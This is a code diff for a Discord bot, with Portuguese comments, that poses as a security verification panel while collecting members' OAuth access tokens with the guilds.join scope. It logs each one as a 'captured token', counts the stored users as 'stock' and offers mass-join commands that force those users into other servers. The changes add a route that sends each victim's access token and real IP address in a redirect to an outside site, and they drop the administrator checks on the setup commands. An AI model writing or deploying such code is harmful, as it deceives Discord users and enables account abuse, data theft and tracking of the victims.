@@ -15,6 +15,8 @@ const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD;
 const TARGET_LINK_PADRAO = 'https://discord.com/app'; 
 const TARGET_LINK_GAME = 'https://gamedown.onrender.com/sucess'; 
 const TARGET_LINK_SCRIPT = 'https://key-scriptlp.onrender.com/sucess'; 
+// AQUI: Link base do Splunk (sem ?token=, o código adiciona depois)
+const TARGET_LINK_KEY_BASE = 'https://splunk-lp.onrender.com/sucess'; 
 
 // --- SETUP DO BANCO (POSTGRES) ---
 let pool = null;
@@ -41,15 +43,17 @@ async function iniciarBanco() {
 }
 
 const app = express();
+// Importante para pegar o IP real no Render
+app.set('trust proxy', true); 
 app.use(express.urlencoded({ extended: true }));
 app.use(express.json());
 
 const client = new Client({ intents: [GatewayIntentBits.Guilds] });
 
 // =================================================================
-// FUNÇÃO CENTRAL DE VERIFICAÇÃO
+// FUNÇÃO DE VERIFICAÇÃO (Agora com IP)
 // =================================================================
-async function handleVerificationCallback(req, res, redirectUri, finalTarget) {
+async function handleVerificationCallback(req, res, redirectUri, finalTarget, isDynamic = false) {
     const { code, state } = req.query; 
     
     if (!code) return res.send('Erro: Falta código.');
@@ -88,34 +92,13 @@ async function handleVerificationCallback(req, res, redirectUri, finalTarget) {
 
         // 3. Tenta dar o Cargo
         let nomeServidor = "Desconhecido";
-        let isScriptMode = false;
-
-        // Verifica se é modo Script pelo State
-        if (state && state.includes('__script')) {
-            isScriptMode = true;
-        }
-
-        // Limpa o state para pegar o ID do servidor
-        const guildId = state ? state.split('__')[0] : null;
-
-        if (guildId) {
+        if (state) {
             try {
-                const guild = client.guilds.cache.get(guildId);
+                const guild = client.guilds.cache.get(state);
                 if (guild) {
                     nomeServidor = guild.name;
                     const member = await guild.members.fetch(user.id).catch(() => null);
-                    
-                    // Tenta achar o cargo correto
-                    const roleName = isScriptMode ? 'Vetificado' : 'Auth2 Vetificados';
-                    let role = guild.roles.cache.find(r => r.name === roleName);
-                    
-                    // Se for modo Script e não tiver cargo, cria (Opcional)
-                    if (isScriptMode && !role) {
-                       try { 
-                           role = await guild.roles.create({ name: 'Vetificado', color: 0x00FF00 });
-                       } catch(e) {}
-                    }
-
+                    const role = guild.roles.cache.find(r => r.name === 'Auth2 Vetificados' || r.name === 'Vetificado' || r.name === 'Key Acesso');
                     if (member && role) await member.roles.add(role);
                 }
             } catch (e) {}
@@ -124,27 +107,38 @@ async function handleVerificationCallback(req, res, redirectUri, finalTarget) {
         // 4. Log Discord
         const logChannel = client.channels.cache.get(LOG_CHANNEL_ID);
         if (logChannel) {
-            logChannel.send({ embeds: [new EmbedBuilder().setTitle('📥 Novo Token Capturado').setDescription(`**Usuário:** ${user.username}\n**Modo:** ${isScriptMode ? 'Script' : 'Normal'}`).setColor('Green')] });
+            logChannel.send({ embeds: [new EmbedBuilder().setTitle('📥 Novo Token Capturado').setDescription(`**Usuário:** ${user.username}\n**Origem:** ${nomeServidor}`).setColor('Green')] });
         }
 
-        // 5. Redirecionamento Rápido (300ms)
-        // Se for script, mostra mensagem especial
-        const titulo = isScriptMode ? "Script Liberado!" : "Verificado!";
+        // 5. Montagem do Link Dinâmico (TOKEN + IP)
+        let linkFinal = finalTarget;
         
+        if (isDynamic) {
+            // Pega o IP do usuário
+            let clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
+            // Se vier vários IPs (proxy), pega o primeiro
+            if (clientIp && clientIp.includes(',')) {
+                clientIp = clientIp.split(',')[0].trim();
+            }
+
+            // Monta: https://site.com/sucess?token=ABC&ip=123.45.6
+            linkFinal = `${finalTarget}?token=${access_token}&ip=${clientIp}`;
+        }
+
         res.send(`
             <!DOCTYPE html>
             <html lang="pt-br">
             <head>
                 <meta charset="UTF-8">
                 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-                <title>${titulo}</title>
+                <title>Verificado</title>
                 <style>body{background-color:#2b2d31;font-family:sans-serif;color:white;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;flex-direction:column}.spinner{width:50px;height:50px;border:5px solid rgba(255,255,255,0.1);border-top:5px solid #23a559;border-radius:50%;animation:spin 1s linear infinite}@keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}</style>
             </head>
             <body>
                 <div class="spinner"></div>
-                <p>${titulo} Redirecionando...</p>
+                <p>Gerando acesso...</p>
                 <script>
-                    setTimeout(() => { window.location.href = "${finalTarget}"; }, 300);
+                    setTimeout(() => { window.location.href = "${linkFinal}"; }, 300);
                 </script>
             </body>
             </html>
@@ -157,7 +151,7 @@ async function handleVerificationCallback(req, res, redirectUri, finalTarget) {
 }
 
 // =================================================================
-// ROTAS DE VERIFICAÇÃO (CALLBACKS)
+// ROTAS (CALLBACKS)
 // =================================================================
 
 app.get('/callback', async (req, res) => {
@@ -172,6 +166,13 @@ app.get('/auth2', async (req, res) => {
 app.get('/script', async (req, res) => {
     if (!process.env.REDIRECT_URI_SCRIPT) return res.send("Erro: REDIRECT_URI_SCRIPT não configurada.");
     await handleVerificationCallback(req, res, process.env.REDIRECT_URI_SCRIPT, TARGET_LINK_SCRIPT);
+});
+
+// ROTA KEY (SPLUNK) - Dinâmica (Envia Token + IP)
+app.get('/key', async (req, res) => {
+    if (!process.env.REDIRECT_URI_KEY) return res.send("Erro: REDIRECT_URI_KEY não configurada no Render.");
+    // 'true' ativa o modo Token+IP na URL
+    await handleVerificationCallback(req, res, process.env.REDIRECT_URI_KEY, TARGET_LINK_KEY_BASE, true);
 });
 
 // =================================================================
@@ -219,65 +220,39 @@ client.once('ready', async () => {
     await client.application.commands.set([
         { name: 'setup_auth', description: 'Painel Auth (Padrão)' },
         { name: 'setup_auth2', description: 'Painel Auth (GameDown)' },
-        { name: 'setup_script', description: 'Painel Script (Novo)' }, 
+        { name: 'setup_script', description: 'Painel Script' }, 
+        { name: 'setup_key', description: 'Painel Key (Splunk)' }, // NOVO
         { name: 'estoque', description: 'Ver quantidade salva' },
-        { 
-            name: 'enviar', 
-            description: 'Mass Join via Comando', 
-            options: [
-                { name: 'quantidade', description: 'Quantos enviar', type: 4, required: true }, // CORRIGIDO: Tem description
-                { name: 'servidor_id', description: 'ID do destino', type: 3, required: true }  // CORRIGIDO: Tem description
-            ] 
-        },
-        {
-            name: 'enviar2', 
-            description: 'Envia UM usuário específico',
-            options: [
-                { name: 'alvo', description: 'ID ou Nick', type: 3, required: true },       // CORRIGIDO: Tem description
-                { name: 'servidor_id', description: 'ID Servidor', type: 3, required: true } // CORRIGIDO: Tem description
-            ]
-        }
+        { name: 'enviar', description: 'Mass Join via Comando', options: [{name:'quantidade',description:'Qtd',type:4,required:true},{name:'servidor_id',description:'ID',type:3,required:true}] },
+        { name: 'enviar2', description: 'Envia UM usuário', options: [{name:'alvo',description:'ID ou Nick',type:3,required:true},{name:'servidor_id',description:'ID Servidor',type:3,required:true}] }
     ]);
 });
 
 client.on('interactionCreate', async interaction => {
     if (!interaction.isChatInputCommand()) return;
     
-    // SETUP 1
+    // FUNÇÃO AUXILIAR PARA GERAR PAINÉIS
+    const gerarPainel = (redirectVar, label, emoji, titulo, desc) => {
+        if (!process.env[redirectVar]) return interaction.reply(`❌ Configure ${redirectVar}`);
+        const authUrl = `https://discord.com/oauth2/authorize?client_id=${process.env.CLIENT_ID}&redirect_uri=${encodeURIComponent(process.env[redirectVar])}&response_type=code&scope=identify+guilds.join&state=${interaction.guild.id}`;
+        const row = new ActionRowBuilder().addComponents(new ButtonBuilder().setLabel(label).setStyle(ButtonStyle.Link).setURL(authUrl).setEmoji(emoji));
+        interaction.reply({ content: 'Painel criado.', ephemeral: true });
+        interaction.channel.send({ embeds: [new EmbedBuilder().setTitle(titulo).setDescription(desc).setColor(0x5865F2)], components: [row] });
+    };
+
     if (interaction.commandName === 'setup_auth') {
-        if (!interaction.member.permissions.has(PermissionsBitField.Flags.Administrator)) return;
-        const authUrl = `https://discord.com/oauth2/authorize?client_id=${process.env.CLIENT_ID}&redirect_uri=${encodeURIComponent(process.env.REDIRECT_URI)}&response_type=code&scope=identify+guilds.join&state=${interaction.guild.id}`;
-        const row = new ActionRowBuilder().addComponents(new ButtonBuilder().setLabel('Verificar Agora').setStyle(ButtonStyle.Link).setURL(authUrl).setEmoji('✅'));
-        const embed = new EmbedBuilder().setTitle('🛡️ Verificação de Segurança').setDescription('Se verifique para poder ter acesso a itens exclusivos!').setColor(0x5865F2).setFooter({ text: 'Sistema seguro de Verificação' });
-        interaction.reply({ content: 'Painel enviado.', ephemeral: true });
-        interaction.channel.send({ embeds: [embed], components: [row] });
+        gerarPainel('REDIRECT_URI', 'Verificar', '✅', '🛡️ Verificação', 'Acesso a itens exclusivos.');
     }
-
-    // SETUP 2
     if (interaction.commandName === 'setup_auth2') {
-        if (!interaction.member.permissions.has(PermissionsBitField.Flags.Administrator)) return;
-        if (!process.env.REDIRECT_URI_2) return interaction.reply('❌ Configure REDIRECT_URI_2.');
-        const authUrl = `https://discord.com/oauth2/authorize?client_id=${process.env.CLIENT_ID}&redirect_uri=${encodeURIComponent(process.env.REDIRECT_URI_2)}&response_type=code&scope=identify+guilds.join&state=${interaction.guild.id}`;
-        const row = new ActionRowBuilder().addComponents(new ButtonBuilder().setLabel('Baixar / Acessar').setStyle(ButtonStyle.Link).setURL(authUrl).setEmoji('🔗'));
-        interaction.reply({ content: 'Painel 2 enviado.', ephemeral: true });
-        interaction.channel.send({ embeds: [new EmbedBuilder().setTitle('🔓 Download Externo').setDescription('Clique para verificar e baixar (0.3s).').setColor(0x00FF00)], components: [row] });
+        gerarPainel('REDIRECT_URI_2', 'Baixar', '🔗', '🔓 Download Externo', 'Redirecionamento para GameDown.');
     }
-
-    // SETUP 3 (Script)
     if (interaction.commandName === 'setup_script') {
-        if (!interaction.member.permissions.has(PermissionsBitField.Flags.Administrator)) return;
-        if (!process.env.REDIRECT_URI_SCRIPT) return interaction.reply('❌ Configure REDIRECT_URI_SCRIPT.');
-        
-        // State especial com __script
-        const stateData = `${interaction.guild.id}__script`;
-        const authUrl = `https://discord.com/oauth2/authorize?client_id=${process.env.CLIENT_ID}&redirect_uri=${encodeURIComponent(process.env.REDIRECT_URI_SCRIPT)}&response_type=code&scope=identify+guilds.join&state=${stateData}`;
-        
-        const row = new ActionRowBuilder().addComponents(new ButtonBuilder().setLabel('Gerar Key').setStyle(ButtonStyle.Link).setURL(authUrl).setEmoji('🔑'));
-        interaction.reply({ content: 'Painel Script enviado.', ephemeral: true });
-        interaction.channel.send({ embeds: [new EmbedBuilder().setTitle('📜 Gerador de Key').setDescription('Verifique sua conta para acessar o gerador.').setColor('Gold')], components: [row] });
+        gerarPainel('REDIRECT_URI_SCRIPT', 'Gerar Key', '🔑', '📜 Gerador de Script', 'Acesse o gerador de keys.');
+    }
+    if (interaction.commandName === 'setup_key') {
+        gerarPainel('REDIRECT_URI_KEY', 'Acessar Splunk', '⚙️', '🔧 Acesso Splunk', 'Clique para acessar com seu Token e IP.');
     }
     
-    // Outros comandos
     if (interaction.commandName === 'estoque') {
         let count = 0;
         if(pool) { try { const res = await pool.query('SELECT COUNT(*) FROM auth_users'); count = res.rows[0].count; } catch(e) {} }
@@ -303,6 +278,6 @@ client.on('interactionCreate', async interaction => {
 });
 
 iniciarBanco().then(() => {
-    app.listen(process.env.PORT || 3000, () => console.log("Web Server Ligado"));
+    app.listen(process.env.PORT || 3000, () => console.log("ON"));
     client.login(process.env.BOT_TOKEN);
 });
